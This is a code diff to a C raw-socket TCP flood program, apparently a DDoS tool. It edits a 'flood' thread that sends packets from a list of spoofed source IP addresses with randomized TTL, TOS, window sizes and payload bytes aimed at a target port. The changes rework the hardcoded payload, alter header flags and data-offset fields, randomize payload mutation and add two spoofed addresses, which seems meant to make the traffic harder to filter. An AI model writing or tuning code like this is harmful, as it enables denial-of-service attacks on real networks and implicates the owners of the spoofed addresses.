@@ -23,7 +23,7 @@ volatile int limiter;
 volatile unsigned int pps;
 volatile unsigned int sleeptime = 100;
 
-static const char PAYLOAD[] = "\x01\x01\x05\x0a\x7e\xb0\x53\x46\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0";
+static const char PAYLOAD[] = "\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0";
 
 void init_rand(unsigned long int x)
 {
@@ -145,18 +145,19 @@ void setup_tcp_header(struct tcphdr *tcph)
 {
 	tcph->source = htons(5678);
 	tcph->check = 0;
-	tcph->ack = 1;
 	tcph->psh = 1;
+	tcph->ack = 1;
+	tcph->urg = 0;
 	tcph->ack_seq = randnum(10000, 99999);
-	tcph->urg_ptr = 1;
+	tcph->urg_ptr = 0;
 	tcph->window = htons(64240);
-	tcph->doff = (sizeof(struct tcphdr) + sizeof(PAYLOAD) - 1) / 4;
+	tcph->doff = sizeof(struct tcphdr) / 4;
 	memcpy((void *)tcph + sizeof(struct tcphdr), PAYLOAD, sizeof(PAYLOAD) - 1);
 }
 
-char *genPayload(char oldPayload[], size_t size)
+char *genPayload(char oldPayload[], size_t size, int limit)
 {
-	for (size_t i = 0; i < size; i++)
+	for (size_t i = 0; i < limit; i++)
 	{
 		for (size_t num = 0; num < size / 2; num++)
 		{
@@ -165,6 +166,7 @@ char *genPayload(char oldPayload[], size_t size)
 		}
 	}
 
+	//printf("Payload: %s\n", oldPayload);
 	return oldPayload;
 }
 
@@ -207,7 +209,9 @@ void *flood(void *par1)
 		2890245379,
 		136146180,
 		2890227716,
-		2890342170};
+		2890342170,
+		137204232,
+		1746866956};
 
 	init_rand(time(NULL));
 	register unsigned int i;
@@ -216,7 +220,7 @@ void *flood(void *par1)
 	{
 		tcph->check = 0;
 		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
-		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(PAYLOAD) - 1) / 4;
+		tcph->doff = sizeof(struct tcphdr) / 4;
 		tcph->dest = htons(floodport);
 		iph->ttl = randnum(64, 128);
 		iph->saddr = htonl(src_ips[rand_cmwc() % (sizeof(src_ips) / sizeof(src_ips[0]))]);
@@ -234,9 +238,9 @@ void *flood(void *par1)
 		int windows[3] = {8192, 64240, 65535};
 		int ctos[3] = {0, 40, 72};
 		iph->tos = ctos[randnum(0, 2)];
-		char stronka[] = "\x01\x01\x05\x0a\x7e\xb0\x53\x46\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0";
+		char stronka[] = "\x7e\xb0\xb0\x53\x46\x7e\xb0\x53\x05\x0a\x7e\xb0\x7e\xb0\x53\x46\x7e\xb0\x53\x47\x0a\x7e\xb0\x53\x46\xb0\x53\x46\x7e\xb0\xb0";
 		tcph->window = htons(windows[randnum(0, 2)]);
-		const char *newpayload = genPayload(stronka, sizeof(stronka) - 1);
+		const char *newpayload = genPayload(stronka, sizeof(stronka), randnum(1, (sizeof(stronka))));
 		memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, sizeof(newpayload) - 1);
 
 		pps++;
